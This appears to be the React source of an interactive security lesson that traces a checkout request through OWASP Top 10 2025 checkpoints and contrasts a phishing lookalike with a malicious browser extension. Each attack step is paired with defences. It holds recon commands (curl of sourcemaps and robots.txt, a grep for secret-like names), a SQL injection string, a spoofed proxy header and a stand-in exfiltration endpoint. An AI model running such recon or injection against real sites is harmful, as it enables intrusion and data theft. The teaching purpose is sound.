import { useEffect, useMemo, useRef, useState } from 'react';
import { AnimatePresence, motion, useReducedMotion } from 'motion/react';
import { createPortal } from 'react-dom';
import './styles.css';

const owasp = {
  A01: ['Broken Access Control', 'https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/'],
  A02: ['Security Misconfiguration', 'https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/'],
  A03: ['Software Supply Chain Failures', 'https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/'],
  A04: ['Cryptographic Failures', 'https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/'],
  A05: ['Injection', 'https://owasp.org/Top10/2025/A05_2025-Injection/'],
  A06: ['Insecure Design', 'https://owasp.org/Top10/2025/A06_2025-Insecure_Design/'],
  A07: ['Authentication Failures', 'https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/'],
  A08: ['Software or Data Integrity Failures', 'https://owasp.org/Top10/2025/A08_2025-Software_or_Data_Integrity_Failures/'],
  A09: ['Security Logging and Alerting Failures', 'https://owasp.org/Top10/2025/A09_2025-Security_Logging_and_Alerting_Failures/'],
  A10: ['Mishandling of Exceptional Conditions', 'https://owasp.org/Top10/2025/A10_2025-Mishandling_of_Exceptional_Conditions/']
};

const route = ['browser', 'edge', 'api', 'parser', 'logic', 'data', 'failure', 'return'];
const phaseLabels = ['Claim', 'Attack', 'Control'];

const reconCommands = [
  {
    id: 'map-download', label: 'Fetch the map', tool: 'curl',
    command: 'curl -s https://shop.example/assets/main.js.map -o main.js.map',
    output: ['$ ls -lh main.js.map', '-rw-r--r--  1 scout  staff  1.8M  main.js.map', '', 'HTTP 200 · application/json'],
    clue: 'A production sourcemap is publicly downloadable.',
    meaning: 'Minified code is no longer much of a speed bump. The map can restore filenames, source structure, and sometimes original source content.',
    defend: 'Do not publish production sourcemaps publicly. If monitoring needs them, upload them privately to the error platform.'
  },
  {
    id: 'map-read', label: 'Read its sources', tool: 'jq',
    command: "jq -r '.sources[]' main.js.map | head",
    output: ['webpack://shop/src/api/checkout.ts', 'webpack://shop/src/auth/session.ts', 'webpack://shop/src/middleware/verifyCsrf.ts', 'webpack://shop/src/admin/debug.ts', 'webpack://shop/src/config/featureFlags.ts'],
    clue: 'Internal filenames reveal architecture and security boundaries.',
    meaning: 'The attacker now has a map of promising code paths: authentication, checkout, middleware, debug routes, and feature flags.',
    defend: 'Treat frontend code as public. Keep secrets and authorization decisions server-side, even when maps are private.'
  },
  {
    id: 'bundle-grep', label: 'Hunt for clues', tool: 'grep',
    command: "grep -Eo '(apiKey|secret|token|debug|admin|internal)[A-Za-z0-9_/-]*' main.js | sort -u",
    output: ['admin/debug', 'apiKeyLabel', 'debugMode', 'internal/preview', 'tokenRefreshPath'],
    clue: 'Interesting names survive bundling even when values are not secrets.',
    meaning: 'A keyword hit is a lead, not proof of a vulnerability. It tells the attacker what routes and assumptions to test next.',
    defend: 'Scan built assets for secrets, but also review exposed route names and remove dead debug code from production bundles.'
  },
  {
    id: 'robots', label: 'Ask the robots', tool: 'curl',
    command: 'curl -s https://shop.example/robots.txt',
    output: ['User-agent: *', 'Disallow: /admin-preview/', 'Disallow: /ops/export/', 'Disallow: /legacy-checkout/'],
    clue: 'robots.txt advertises three sensitive-looking paths.',
    meaning: 'Robots rules ask crawlers not to index a path. They are not access control—and can become a convenient reconnaissance list.',
    defend: 'Only list paths that may safely be public. Protect every sensitive route with authentication and authorization.'
  },
  {
    id: 'post-probe', label: 'Probe the gate', tool: 'curl',
    command: "curl -i -X POST https://shop.example/api/checkout -H 'Content-Type: application/json' -d '{}'",
    output: ['HTTP/2 400 Bad Request', 'x-powered-by: Express', 'x-middleware: session, parseCart, verifyCsrf, checkout', 'content-type: application/json', '', '{"error":"cartId is required","requestId":"req_probe_19"}'],
    clue: 'One harmless invalid request leaks framework and middleware order.',
    meaning: 'Verbose headers and errors help an attacker model the request pipeline, then choose where to focus experiments.',
    defend: 'Return stable, minimal client errors. Remove framework banners and internal middleware names; keep the detail in correlated server logs.'
  }
];

const compromisePaths = {
  phishing: {
    short: 'Phishing site',
    label: 'A · Phishing site',
    description: 'A convincing surface on the wrong origin',
    color: 'var(--phish)',
    steps: ['Weaponize', 'Sign-in fork', 'Wrong origin', 'Data entry', 'Collector', 'Session replay', 'Impact']
  },
  extension: {
    short: 'Local extension',
    label: 'B · Local extension',
    description: 'The right site with hostile code beside it',
    color: 'var(--extension)',
    steps: ['Install', 'Session created', 'Right origin', 'DOM control', 'Two requests', 'Privilege gap', 'Impact']
  }
};

const journeyBeats = [
  {
    label: 'The setup', time: 'T − 3 days', progress: 0, focus: 'attacker',
    title: 'The click begins before Maya arrives.',
    thesis: 'The attacker prepares a believable path, then waits for a normal human moment.',
    phishing: {
      maya: { location: 'Away from the browser', status: 'Unaware', title: 'Nothing has happened to Maya yet.', body: 'Her real account and session are still intact.' },
      browser: { location: 'No hostile tab open', status: 'Clean', title: 'The browser has no special knowledge.', body: 'A future padlock will prove encryption to a domain—not that the domain is the one Maya intended.' },
      attacker: { location: 'Lookalike kit · remote server', status: 'Building', title: 'Copy the surface. Change the destination.', body: 'A cloned checkout is deployed at shop-example.help with a collector behind the Pay button.', artifact: 'POST /collect  ←  checkout form' },
      evidence: [['origin', 'shop-example.help', 'attacker'], ['cookie', 'none from shop.example', 'browser'], ['surface', 'pixel-matched checkout', 'attacker']]
    },
    extension: {
      maya: { location: 'Extension store', status: 'Trust decision', title: 'A useful tool asks for broad access.', body: '“Parcel Price Finder” promises automatic delivery discounts.' },
      browser: { location: 'Permission prompt', status: 'Awaiting grant', title: 'The warning is accurate—but abstract.', body: 'Read and change data on shop.example is the capability boundary.' },
      attacker: { location: 'Extension package · v2.4.1', status: 'Publishing', title: 'Useful code wraps a delayed payload.', body: 'The hostile behavior stays dormant until the extension sees a checkout page.', artifact: 'matches: ["*://shop.example/*"]' },
      evidence: [['host permission', 'read + change shop.example', 'browser'], ['trigger', '/checkout', 'attacker'], ['document.cookie', 'HttpOnly hidden', 'secure']]
    }
  },
  {
    label: 'The sign-in', time: 'T − 4 min', progress: 1, focus: 'browser',
    title: 'Authentication creates a browser capability.',
    thesis: 'A successful login creates reusable proof. Where that proof is stored decides which attacker can steal it—and which can merely ride it.',
    phishing: {
      maya: { location: 'Lookalike login', status: 'Types credentials', title: 'The password form feels like a normal interruption.', body: 'Maya volunteers email, password, and possibly a one-time code to the attacker origin.' },
      browser: { location: 'Origin · shop-example.help', status: 'No shop session', title: 'The real shop cookie remains isolated.', body: 'Same-origin policy and cookie scoping still work. The lookalike receives only what Maya submits to it.' },
      attacker: { location: 'Collector → real login', status: 'Credential replay', title: 'Create a new authenticated session.', body: 'The attacker replays the captured credential or relays MFA to shop.example. If login succeeds, the shop issues a separate attacker-controlled session.', artifact: 'Set-Cookie: session=s_attacker' },
      evidence: [['captured', 'password + optional OTP', 'attacker'], ['Maya shop cookie', 'not exposed', 'secure'], ['attacker session', 'possible after replay', 'attacker']]
    },
    extension: {
      maya: { location: 'shop.example/login', status: 'Authenticates normally', title: 'The sign-in is genuine.', body: 'Maya posts credentials to the real shop and completes MFA on the correct origin.' },
      browser: { location: 'Cookie jar', status: 'Session established', title: 'The browser stores ambient authority.', body: 'The server returns a Secure, HttpOnly, SameSite cookie. JavaScript cannot read the value, but matching requests receive it automatically.' },
      attacker: { location: 'Content script', status: 'document.cookie blocked', title: 'The token stays hidden; the page stays usable.', body: 'Without the separate cookies permission, this extension cannot extract the HttpOnly value. It can still observe DOM state and ride the authenticated session.', artifact: 'Cookie: session=s_7f2a · hidden from page JS' },
      evidence: [['Set-Cookie', 'Secure · HttpOnly · SameSite=Lax', 'secure'], ['script access', 'cookie value blocked', 'secure'], ['ambient use', 'attached on shop requests', 'browser']]
    }
  },
  {
    label: 'The arrival', time: 'T − 18 s', progress: 2, focus: 'maya',
    title: 'Maya sees a checkout. The browser sees a context.',
    thesis: 'Visual familiarity and technical identity are different signals.',
    phishing: {
      maya: { location: 'Tab · “Shop delivery”', status: 'Believes: shop.example', title: 'The page looks exactly right.', body: 'The cart, total, type, and logo all match the message she expected.' },
      browser: { location: 'Origin · shop-example.help', status: 'Actually: lookalike', title: 'The address bar tells the quieter story.', body: 'TLS protects this connection to the attacker domain. Cookie host scoping prevents the shop cookie attaching; SOP/CORS govern script access to other origins.' },
      attacker: { location: 'Collector · listening', status: 'Waiting', title: 'No exploit is needed yet.', body: 'The attacker needs Maya to volunteer data to this origin.', artifact: '200 OK  ·  TLS valid' },
      evidence: [['seen by Maya', 'Shop checkout', 'maya'], ['actual origin', 'shop-example.help', 'attacker'], ['shop session', 'not attached', 'secure']]
    },
    extension: {
      maya: { location: 'Tab · shop.example/checkout', status: 'Correct destination', title: 'The page really is the shop.', body: 'The address, certificate, and visible checkout are all legitimate.' },
      browser: { location: 'Origin · shop.example', status: 'Extension active', title: 'A second execution context wakes up.', body: 'The granted extension injects a content script next to the page and observes DOM-visible fields.' },
      attacker: { location: 'MV3 extension service worker', status: 'Connected', title: 'The foothold arrived locally.', body: 'Its command channel receives “checkout detected” and returns the collection rule.', artifact: 'event: CHECKOUT_DETECTED' },
      evidence: [['actual origin', 'shop.example', 'secure'], ['isolated content script', 'DOM access', 'attacker'], ['document.cookie', 'HttpOnly hidden', 'secure']]
    }
  },
  {
    label: 'The invisible edit', time: 'T − 400 ms', progress: 3, focus: 'browser',
    title: 'One screen. Two different truths underneath.',
    thesis: 'The last trustworthy moment is the one just before intent becomes a request.',
    phishing: {
      maya: { location: 'Lookalike checkout', status: 'Ready to pay', title: 'RM129 · Pay now', body: 'Maya sees the action she came here to complete.' },
      browser: { location: 'DOM · hostile origin', status: 'Form target differs', title: 'The button is wired to the collector.', body: 'Typed card and account fields belong to this page. The real shop never receives this click.' },
      attacker: { location: 'Page JavaScript', status: 'Handler armed', title: 'Prevent the normal submit. Keep the illusion.', body: 'The handler copies fields, posts them to /collect, then paints a local success state.', artifact: 'button → capture() → fakeSuccess()' },
      evidence: [['button label', 'Pay now', 'maya'], ['submit target', '/collect', 'attacker'], ['session cookie', 'absent', 'secure']]
    },
    extension: {
      maya: { location: 'Legitimate checkout', status: 'Ready to pay', title: 'RM129 · Pay now', body: 'Nothing visible suggests that the page has a second observer.' },
      browser: { location: 'DOM · before serialization', status: 'Field mutated', title: 'A DOM value changes behind the surface.', body: 'The extension swaps delivery.account to drop_772. Page code will later serialize the altered value.' },
      attacker: { location: 'Content script', status: 'Hook armed', title: 'Observe the click. Alter only what matters.', body: 'It cannot read the HttpOnly value through page JavaScript, but it can alter a form value that new FormData(form) will serialize.', artifact: 'delivery.account = "drop_772"' },
      evidence: [['visible total', 'RM129', 'maya'], ['delivery.account', 'drop_772', 'attacker'], ['session cookie', 'HttpOnly · unreadable', 'secure']]
    }
  },
  {
    label: 'The click', time: 'T = 0 ms', progress: 4, focus: 'split', pulse: true,
    title: 'Maya supplies intent. The context decides its meaning.',
    thesis: 'A click is physical feedback; the security event is the code and origin that receive it.',
    phishing: {
      maya: { location: 'Lookalike checkout', status: 'Clicks Pay', title: 'The button depresses. Maya is done.', body: 'Her gesture is genuine, but it is addressed to the wrong party.' },
      browser: { location: 'Event loop · hostile tab', status: 'submit intercepted', title: 'click → listener → fetch()', body: 'The browser correctly executes attacker-owned JavaScript for shop-example.help.' },
      attacker: { location: 'Collector endpoint', status: 'Inbound', title: 'The volunteered fields cross the wire.', body: 'No shop cookie crosses origins. The captured credentials and form data do.', artifact: 'POST shop-example.help/collect' },
      evidence: [['gesture', 'trusted human click', 'maya'], ['receiver', 'hostile event listener', 'attacker'], ['request origin', 'shop-example.help', 'browser']]
    },
    extension: {
      maya: { location: 'Legitimate checkout', status: 'Clicks Pay', title: 'The button depresses. Maya is done.', body: 'Her gesture is genuine and occurs on the intended site.' },
      browser: { location: 'Page + extension contexts', status: 'Two flows begin', title: 'One click wakes two listeners.', body: 'The shop builds its checkout request. The content script separately sends DOM-visible data to its MV3 service worker.' },
      attacker: { location: 'MV3 extension service worker', status: 'Outbound queued', title: 'Ambient access turns into action.', body: 'The extension does not need the cookie value: the legitimate browser request already carries it to the shop.', artifact: 'shop fetch()  +  runtime.sendMessage()' },
      evidence: [['gesture', 'trusted human click', 'maya'], ['shop request', 'cookie auto-attached', 'browser'], ['extension copy', 'DOM fields', 'attacker']]
    }
  },
  {
    label: 'Under the hood', time: 'T + 3 ms', progress: 4, focus: 'browser',
    title: 'The browser does exactly what each context permits.',
    thesis: 'Compromise is often two valid mechanisms composed into an invalid outcome.',
    phishing: {
      maya: { location: 'Waiting for confirmation', status: 'No warning', title: 'A spinner makes the pause feel ordinary.', body: 'The interface buys enough time to collect and relay what Maya entered.' },
      browser: { location: 'Network · attacker origin', status: 'Encrypted outbound', title: 'The payload is protected in transit.', body: 'TLS makes theft private between Maya and the attacker. It does not certify business identity.' },
      attacker: { location: 'Collector + real shop', status: 'Relaying', title: 'Captured credentials start a separate session.', body: 'The attacker can attempt a real login or purchase flow with the volunteered data; they never inherit Maya’s shop cookie by magic.', artifact: 'collector → separate login attempt' },
      evidence: [['TLS', 'valid', 'browser'], ['shop cookie', 'never exposed', 'secure'], ['captured data', 'credentials + form', 'attacker']]
    },
    extension: {
      maya: { location: 'Waiting for confirmation', status: 'No warning', title: 'The real checkout continues normally.', body: 'The compromise does not need to break the happy path.' },
      browser: { location: 'Network · two destinations', status: 'Fan-out', title: 'The same moment produces two requests.', body: 'POST /api/checkout goes to shop.example with ambient credentials; copied fields go to the extension collector.' },
      attacker: { location: 'Collector · remote', status: 'Data received', title: 'Local privilege crosses into remote control.', body: 'The attacker receives the altered delivery account and DOM-visible order details.', artifact: 'POST collector.invalid/events' },
      evidence: [['shop request', 'session=s_7f2a', 'browser'], ['cart body', 'delivery=drop_772', 'attacker'], ['exfil request', 'no HttpOnly cookie', 'secure']]
    }
  },
  {
    label: 'The privilege gap', time: 'T + 31 ms', progress: 5, focus: 'attacker',
    title: 'Same symptom. Different powers.',
    thesis: 'Do not name the attack first. Ask where the attacker runs, what power they gain, and which trust promise actually breaks.',
    phishing: {
      maya: { location: 'Attacker-owned origin', status: 'Social trust bypassed', title: 'The exploit is the destination decision.', body: 'Maya gave data to the wrong principal. The browser enforced its origin model correctly.' },
      browser: { location: 'Policy boundaries', status: 'SOP still intact', title: 'No browser sandbox was bypassed.', body: 'CORS is irrelevant to data submitted to the attacker. CSRF defenses protect shop actions, not secrets typed into a lookalike.' },
      attacker: { location: 'Collector + replay client', status: 'New capabilities', title: 'Reusable secrets become a separate identity.', body: 'The attacker gains credentials, typed checkout data, and possibly a fresh shop session after replay—not Maya’s original HttpOnly cookie.', artifact: 'credential theft ≠ cookie theft ≠ CSRF' },
      evidence: [['bypassed', 'human origin verification', 'attacker'], ['still enforced', 'SOP · cookie scoping', 'secure'], ['follow-on', 'credential replay / MFA relay', 'attacker']]
    },
    extension: {
      maya: { location: 'Trusted shop UI', status: 'UI integrity lost', title: 'Authentication succeeded exactly as designed.', body: 'The harmful request uses Maya’s real session and a real user gesture.' },
      browser: { location: 'Page + extension worlds', status: 'Granted local capability', title: 'The extension composes two legitimate channels.', body: 'The page sends an authenticated shop request. The extension service worker sends a separate exfiltration request under extension permissions.' },
      attacker: { location: 'Remote collector', status: 'Authority without token theft', title: 'The attacker rides the session and steals context.', body: 'They bypass client-side UI integrity and any assumption that a valid session proves unmodified intent. HttpOnly still prevents reading the cookie string.', artifact: 'authenticated action + out-of-band exfiltration' },
      evidence: [['bypassed', 'trusted-client assumption', 'attacker'], ['still enforced', 'HttpOnly cookie secrecy', 'secure'], ['server gap', 'recipient not re-authorized', 'attacker']]
    }
  },
  {
    label: 'The two receipts', time: 'T + 214 ms', progress: 6, focus: 'split',
    title: 'Success for Maya can also be success for the attacker.',
    thesis: 'The absence of friction is not evidence that the system stayed whole.',
    phishing: {
      maya: { location: 'Lookalike confirmation', status: 'Sees: Payment received', title: 'A receipt appears on schedule.', body: 'It is a local animation, not proof that the shop accepted anything.' },
      browser: { location: 'Hostile tab · no navigation', status: 'Paint complete', title: 'The browser paints what the origin tells it.', body: 'There is no trusted receipt identifier from shop.example to bind this surface to a real order.' },
      attacker: { location: 'Collector dashboard', status: 'Capture complete', title: 'A second receipt records the theft.', body: 'The attacker has the submitted data and a timestamped victim event.', artifact: 'capture_7F2A  ·  200 OK' },
      evidence: [['Maya sees', 'Payment received', 'maya'], ['trusted order ID', 'missing', 'attacker'], ['attacker sees', 'capture complete', 'attacker']]
    },
    extension: {
      maya: { location: 'Real shop confirmation', status: 'Sees: Payment received', title: 'The receipt is genuine.', body: 'Her payment completed, so the experience gives her no reason to investigate.' },
      browser: { location: 'shop.example + extension', status: 'Both complete', title: 'The good and bad outcomes coexist.', body: 'A 200 response validates processing, not the provenance of every client-controlled field.' },
      attacker: { location: 'Drop account · drop_772', status: 'Order redirected', title: 'The attacker’s state changed too.', body: 'The manipulated delivery value survived because the server trusted a browser-owned invariant.', artifact: 'delivery.account → drop_772' },
      evidence: [['shop response', '200 · ord_8821', 'secure'], ['delivery owner', 'not reverified', 'attacker'], ['attacker sees', 'order redirected', 'attacker']]
    }
  },
  {
    label: 'The rewind', time: 'T ↶', progress: 6, focus: 'browser', controls: true,
    title: 'Stop the chain where the truth first diverges.',
    thesis: 'Good controls do not ask Maya to become a security engine. They remove attacker leverage at the boundary.',
    phishing: {
      maya: { location: 'Before the lure', status: 'Protected by context', title: 'Make destination identity hard to miss.', body: 'Password-manager origin binding and trusted navigation remove the lookalike’s strongest illusion.' },
      browser: { location: 'Origin boundary', status: 'Divergence visible', title: 'Bind secrets and proof to the real origin.', body: 'Passkeys resist credential relay; a shop-issued receipt must carry a verifiable order ID.' },
      attacker: { location: 'Lookalike origin', status: 'Capability reduced', title: 'The clone can copy pixels, not origin-bound proof.', body: 'The attacker is left with a convincing page that cannot obtain reusable authentication material.', artifact: 'PASSKEY ORIGIN MISMATCH' },
      evidence: [['01', 'Password manager will not fill', 'secure'], ['02', 'Passkey checks origin', 'secure'], ['03', 'Receipt verified with shop', 'secure']]
    },
    extension: {
      maya: { location: 'Permission decision', status: 'Least access', title: 'Make broad capability exceptional.', body: 'Use-on-click access and permission reviews shorten the time hostile code can inhabit a trusted page.' },
      browser: { location: 'Client + server boundary', status: 'Invariant restored', title: 'Treat extension-altered data as untrusted.', body: 'Re-derive account ownership server-side, require confirmation for sensitive changes, and monitor extension risk.' },
      attacker: { location: 'Extension context', status: 'Blocked at server', title: 'DOM control no longer grants domain authority.', body: 'Even a hostile local script cannot redirect delivery without fresh, server-verified intent.', artifact: '403 · RECIPIENT_REVERIFY' },
      evidence: [['01', 'Narrow site permission', 'secure'], ['02', 'Server owns recipient', 'secure'], ['03', 'Step-up on sensitive change', 'secure']]
    }
  }
];

const checkpoints = [
  {
    label: 'The browser', zone: 'browser', time: '0.300 ms', minutes: 2.5, lenses: ['A07', 'A08'],
    title: 'Check every value from the browser.',
    thesis: 'The browser sends a session, an origin, and request data. The server must verify each value before it uses the value.',
    prompt: 'Does HTTPS make any of these values trustworthy?',
    packet: [
      { label: 'POST', values: ['/api/checkout', '/api/checkout', '/api/checkout'] },
      { label: 'Cookie', values: ['session=s_7f2a', 'session=s_7f2a', 'session=s_7f2a · HttpOnly'] },
      { label: 'Origin', values: ['https://shop.example', 'https://evil.example', 'https://shop.example · verified'] },
      { label: 'X-CSRF', values: ['—', '—', 'csrf_91d… · verified'] },
      { label: 'Body', values: ['cart_1042 · RM129', 'cart_1042 · RM129', 'cart_1042 · RM129'] }
    ],
    phases: [
      { title: 'The session cookie identifies Maya’s session.', body: 'The cookie does not prove that Maya approved this payment.', signal: 'Claim: identity and intent', result: 'CLAIMS NOT VERIFIED' },
      { title: 'A hostile page sends the request.', body: 'A CSRF attack uses cookies that the browser adds automatically. An XSS attack runs a malicious script with the user’s permissions.', signal: 'Attack: false intent', result: 'REQUEST FORGED' },
      { title: 'Verify the source and intent.', body: 'Verify the Origin header and a CSRF token that is bound to the session. Use a SameSite cookie as an additional control. Prevent script injection with correct output encoding and a strict CSP.', signal: 'Control: browser and server', result: 'INTENT VERIFIED', actions: ['SameSite cookie', 'Origin + CSRF token', 'Output encoding + strict CSP'] }
    ],
    note: 'Ask the question before you show the answer. HTTPS protects data while it moves across the network. It does not verify the request data. The application must verify each claim.'
  },
  {
    label: 'The edge', zone: 'edge', time: '31.700 ms', minutes: 2.5, lenses: ['A02', 'A04'],
    title: 'TLS protects data in transit.',
    thesis: 'TLS prevents a network observer from reading or changing the data. TLS does not verify the sender or the edge configuration.',
    prompt: 'What does the TLS padlock verify? What does it not verify?',
    packet: [
      { label: 'TLS', values: ['1.3 · certificate valid', '1.3 · certificate valid', '1.3 + HSTS'] },
      { label: 'Host', values: ['shop.example', 'admin.shop.example', 'shop.example · allow-listed'] },
      { label: 'Route', values: ['/api/checkout', '/debug/config', '/api/checkout'] },
      { label: 'CORS', values: ['shop.example', '* + credentials', 'explicit origins'] },
      { label: 'Client IP', values: ['203.0.113.42', 'X-Forwarded-For: 127.0.0.1', 'trusted proxy chain'] }
    ],
    phases: [
      { title: 'TLS protects the network connection.', body: 'The request is private while it moves across the network. TLS also shows if the data changes in transit.', signal: 'Claim: transit is protected', result: 'TLS OK' },
      { title: 'The edge configuration allows unsafe access.', body: 'A public debug route, a broad origin policy, or a false proxy header can bypass application controls.', signal: 'Attack: unsafe access', result: 'EDGE CONFIGURATION FAILED' },
      { title: 'Allow only required access.', body: 'Use approved configurations. Define the allowed routes, origins, and proxies. Use current TLS and HSTS.', signal: 'Control: limit access', result: 'EDGE POLICY PASSED', actions: ['Allowed routes', 'Allowed origins', 'Trusted proxies'] }
    ],
    note: 'Do not describe the WAF as a complete control. The edge can block known bad traffic and enforce the transport policy. The application must decide if Maya can buy the cart.'
  },
  {
    label: 'The API gate', zone: 'api', time: '64.200 ms', minutes: 3, lenses: ['A01', 'A07'],
    title: 'Authenticate the user. Authorize the action.',
    thesis: 'A valid session identifies the user. It does not give the user access to every action or object.',
    prompt: 'Where must the system verify that Maya owns the cart?',
    packet: [
      { label: 'session.user', values: ['maya', 'maya', 'maya'] },
      { label: 'action', values: ['checkout', 'checkout', 'checkout'] },
      { label: 'cartId', values: ['cart_1042', 'cart_1043', 'cart_1043'] },
      { label: 'cart.owner', values: ['maya', 'devon', 'devon'] },
      { label: 'decision', values: ['not checked', '200 OK', '403 + req_7F2A'] }
    ],
    phases: [
      { title: 'Maya has a valid session.', body: 'Authentication identifies Maya. The server must also verify that Maya can check out this cart.', signal: 'Claim: session is valid', result: 'IDENTITY KNOWN' },
      { title: 'The attacker changes the cart ID.', body: 'The server does not check the cart owner. As a result, Maya’s session can access Devon’s cart.', signal: 'Attack: cart_1042 → cart_1043', result: 'DEVON’S CART EXPOSED' },
      { title: 'Check the user, action, and object.', body: 'Authorize every request on the server. Deny access by default. Test all expected access decisions.', signal: 'Control: object authorization', result: '403 FORBIDDEN', actions: ['Deny by default', 'Check ownership', 'Test access rules'] }
    ],
    note: 'Pause after you show the attack. A predictable ID is not the main cause. A random ID can make discovery more difficult. Only server-side authorization prevents the access.'
  },
  {
    label: 'The parser', zone: 'parser', time: '68.900 ms', minutes: 3, lenses: ['A05'],
    title: 'Keep data separate from code.',
    thesis: 'An interpreter can treat untrusted data as instructions. The application must keep the program structure separate from input values.',
    prompt: 'How can the application keep the coupon value out of the SQL structure?',
    packet: [
      { label: 'coupon', values: ['WELCOME10', "x' OR '1'='1", "x' OR '1'='1"] },
      { label: 'query', values: ["… code = 'WELCOME10'", "… code = 'x' OR '1'='1'", '… code = $1'] },
      { label: 'params', values: ['—', '—', '["x\' OR \'1\'=\'1"]'] },
      { label: 'rows', values: ['1 coupon', 'all coupons', '0 coupons'] },
      { label: 'mode', values: ['concatenated', 'concatenated', 'parameterized'] }
    ],
    phases: [
      { title: 'The coupon must be data only.', body: 'String concatenation puts the coupon value in the SQL statement. The value can then change the SQL structure.', signal: 'Claim: the value stays data', result: 'CODE AND DATA MIXED' },
      { title: 'The input changes the SQL statement.', body: 'The quote ends the string. The remaining input becomes SQL syntax.', signal: 'Attack: SQL injection', result: 'QUERY CHANGED' },
      { title: 'Use a parameterized query.', body: 'Send the SQL statement and its values separately. Validate the input format. Encode data when you put it in an output format.', signal: 'Control: safe API', result: 'INPUT STAYS DATA', actions: ['Parameterized SQL', 'Output encoding', 'Allowed input format'] }
    ],
    note: 'Do not only say “sanitize input.” SQL, HTML, shell commands, and URLs have different rules. Use an API that keeps data separate from the program structure.'
  },
  {
    label: 'Business logic', zone: 'logic', time: '70.100 ms', minutes: 3, lenses: ['A06'],
    title: 'Valid input can still break a business rule.',
    thesis: 'A schema checks the format of the input. The server must also enforce rules for price, sequence, frequency, and state.',
    prompt: 'The JSON format is valid. Why must the server reject the request?',
    packet: [
      { label: 'sku', values: ['COURSE-01', 'COURSE-01', 'COURSE-01'] },
      { label: 'quantity', values: ['1', '1', '1'] },
      { label: 'clientTotal', values: ['129.00', '1.00', 'ignored'] },
      { label: 'catalogTotal', values: ['not loaded', 'not loaded', '129.00'] },
      { label: 'idempotency', values: ['ik_7f2a', 'replayed ×12', 'ik_7f2a · seen'] }
    ],
    phases: [
      { title: 'The request has the correct format.', body: 'Each field has the correct data type. However, the client controls the payment total.', signal: 'Claim: valid input is allowed', result: 'FORMAT VALID' },
      { title: 'The attacker changes valid values.', body: 'The attacker lowers the total and sends the request 12 times. The request does not need a format error to cause harm.', signal: 'Attack: change price and repeat', result: 'RM1.00 × 12' },
      { title: 'Enforce business rules on the server.', body: 'Get the price from the server catalog. Enforce each allowed state change. Use an idempotency key to prevent repeated processing.', signal: 'Control: business rules', result: 'RM129.00 · ONCE', actions: ['Server price', 'State machine', 'Idempotency key'] }
    ],
    note: 'Explain the difference between format validation and business rules. Ask who controls the payment total. The server must get the total from trusted catalog data.'
  },
  {
    label: 'The data layer', zone: 'data', time: '71.800 ms', minutes: 2.5, lenses: ['A04', 'A08'],
    title: 'Limit data access and permissions.',
    thesis: 'An application defect can give an attacker access to the data layer. Store less sensitive data and give the application only the permissions that it needs.',
    prompt: 'If an attacker controls the application role, which data and actions must remain blocked?',
    packet: [
      { label: 'db role', values: ['app_owner', 'app_owner', 'checkout_writer'] },
      { label: 'can read', values: ['all tables', 'users + secrets + cards', 'checkout view only'] },
      { label: 'payment data', values: ['stored PAN', 'exported PAN', 'provider token'] },
      { label: 'key', values: ['long-lived env key', 'copied from process', 'scoped KMS identity'] },
      { label: 'write', values: ['any state', 'paid=true', 'approved transition only'] }
    ],
    phases: [
      { title: 'The application needs limited database access.', body: 'It does not need owner permissions. It also does not need all sensitive data.', signal: 'Claim: the application is trusted', result: 'ACCESS TO ENTIRE DATABASE' },
      { title: 'The defect gives the attacker broad access.', body: 'The attacker can read secrets, export payment data, or write an invalid state.', signal: 'Attack: use excessive permissions', result: 'MORE DATA EXPOSED' },
      { title: 'Store less data and allow fewer actions.', body: 'Use payment tokens. Use narrow database roles and views. Keep keys out of source code. Permit only valid writes.', signal: 'Control: least privilege', result: 'ACCESS LIMITED', actions: ['Store less data', 'Narrow DB role', 'Managed keys'] }
    ],
    note: 'Encryption does not help if the compromised process can use the decryption key. First, remove data that you do not need. Then select the correct encryption method and key life cycle.'
  },
  {
    label: 'The failure path', zone: 'failure', time: '83.400 ms', minutes: 3, lenses: ['A10'],
    title: 'Define safe behavior for failures.',
    thesis: 'An attacker can cause timeouts, repeated requests, race conditions, and partial writes. The system must handle these conditions safely.',
    prompt: 'What must the payment service do when the risk service does not respond?',
    packet: [
      { label: 'risk service', values: ['pending', 'timeout', 'timeout'] },
      { label: 'fallback', values: ['unspecified', 'approve()', 'queueForReview()'] },
      { label: 'retry', values: ['unbounded', '×47', 'bounded + jitter'] },
      { label: 'database', values: ['charge → order', 'charge ✓ · order ✕', 'atomic transition'] },
      { label: 'decision', values: ['unknown', 'approved', 'review'] }
    ],
    phases: [
      { title: 'The normal flow uses the risk service.', body: 'The design does not specify what to do when the risk service is not available.', signal: 'Claim: the dependency responds', result: 'FAILURE STATE NOT DEFINED' },
      { title: 'The attacker causes a failure.', body: 'Resource exhaustion or a special input causes a timeout. The service then approves on error or sends too many retries.', signal: 'Attack: cause an error', result: 'PAYMENT APPROVED ON ERROR' },
      { title: 'Define and test a safe failure state.', body: 'Limit retries and resource use. Make related writes atomic. Send uncertain payments for review or reject them.', signal: 'Control: failure policy', result: 'HELD FOR REVIEW', actions: ['Use a safe state', 'Set limits', 'Atomic writes'] }
    ],
    note: 'The safe failure state depends on the operation. A recommendation service can return less data. A payment can require review or rejection. Define and test the failure state.'
  },
  {
    label: 'The return', zone: 'return', time: '214.000 ms', minutes: 3, lenses: ['A02', 'A09'],
    title: 'Return a safe response. Record useful details.',
    thesis: 'The client needs a clear result and a request ID. The operations team needs detailed and correlated logs. Do not send internal details to the client.',
    prompt: 'Which details does the user need? Which details must remain in server logs?',
    packet: [
      { label: 'status', values: ['500', '500', '503'] },
      { label: 'client body', values: ['Error', 'stack + SQL + host', 'Payment pending'] },
      { label: 'request ID', values: ['—', '—', 'req_7F2A'] },
      { label: 'server log', values: ['console.log(error)', 'token + stack', 'structured + redacted'] },
      { label: 'alert', values: ['none', 'none', 'owner paged'] }
    ],
    phases: [
      { title: 'The request fails.', body: 'A generic error without a request ID does not help the user or the operations team find the event.', signal: 'Claim: the error is sufficient', result: 'NO REQUEST ID' },
      { title: 'The response exposes internal data.', body: 'A stack trace can show file paths, versions, database hosts, and queries. Logs can also expose tokens if the application records them.', signal: 'Attack: collect internal data', result: 'INTERNAL DATA EXPOSED' },
